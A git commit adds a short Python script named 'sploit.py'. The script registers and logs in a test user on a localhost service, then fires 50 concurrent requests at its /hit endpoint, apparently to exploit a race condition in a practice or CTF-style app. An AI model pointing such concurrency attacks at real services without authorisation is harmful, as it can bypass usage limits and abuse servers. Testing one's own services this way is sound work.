29a2cdb0c6ed85abeb534eb4d0a3fd0bd2c1a09c
Anton Nikolaev <regwebghost@yandex.ru>
2020-03-18 05:29:33 +0700

    Add sploit (#9)
    * Add sploit
    
    * Update requirements
    
    * Ignore venv dev

---
+++ sploit.py
@@ -0,0 +1,91 @@
+#!/usr/bin/env python3
+
+import asyncio
+import aiohttp
+from json import dumps
+from asyncio_pool import AioPool
+from random import randrange, choice
+
+
+_session = None
+
+
+async def get_session():
+    global _session
+    if _session is None:
+        _session = aiohttp.ClientSession()
+    return _session
+
+
+class DefaultValues:
+    HOST = "localhost"
+    PORT = 9000
+    USERNAME = "test"
+    PASSWORD = USERNAME
+    POOL_SIZE = 10
+    REQUESTS_QUANTITY = 50
+    RAND_RANGE = 99
+
+
+class PrepareHits:
+    def __init__(
+        self, session, host: str = DefaultValues.HOST, port: int = DefaultValues.PORT
+    ):
+        self.host = host
+        self.port = str(port)
+        self.base_url = f"http://{self.host}:{self.port}"
+        self.session = session
+        self.random = str(randrange(DefaultValues.RAND_RANGE))
+
+    async def register(
+        self,
+        username: str = DefaultValues.USERNAME,
+        password: str = DefaultValues.PASSWORD,
+    ):
+        payload = {
+            "username": f"{username}-{self.random}",
+            "password": f"{password}-{self.random}",
+        }
+        async with self.session.post(
+            f"{self.base_url}/register", data=dumps(payload).encode()
+        ) as resp:
+            print(resp.status, await resp.json())
+
+    async def login(
+        self,
+        username: str = DefaultValues.USERNAME,
+        password: str = DefaultValues.PASSWORD,
+    ):
+        payload = {
+            "username": f"{username}-{self.random}",
+            "password": f"{password}-{self.random}",
+        }
+        async with self.session.post(
+            f"{self.base_url}/login", data=dumps(payload).encode()
+        ) as resp:
+            print(resp.status, await resp.json())
+
+    async def make_hit(self):
+        async with self.session.get(f"{self.base_url}/hit") as resp:
+            return resp.status, await resp.json()
+
+
+async def main():
+    async with await get_session() as session:
+        preparation_steps = PrepareHits(session)
+        await preparation_steps.register()
+        await preparation_steps.login()
+        futures = []
+        async with AioPool(size=DefaultValues.POOL_SIZE) as pool:
+            try:
+                for _ in range(DefaultValues.REQUESTS_QUANTITY):
+                    future = await pool.spawn(preparation_steps.make_hit())
+                    futures.append(future)
+                for fut in futures:
+                    print(*fut.result())
+            except asyncio.InvalidStateError:
+                return
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
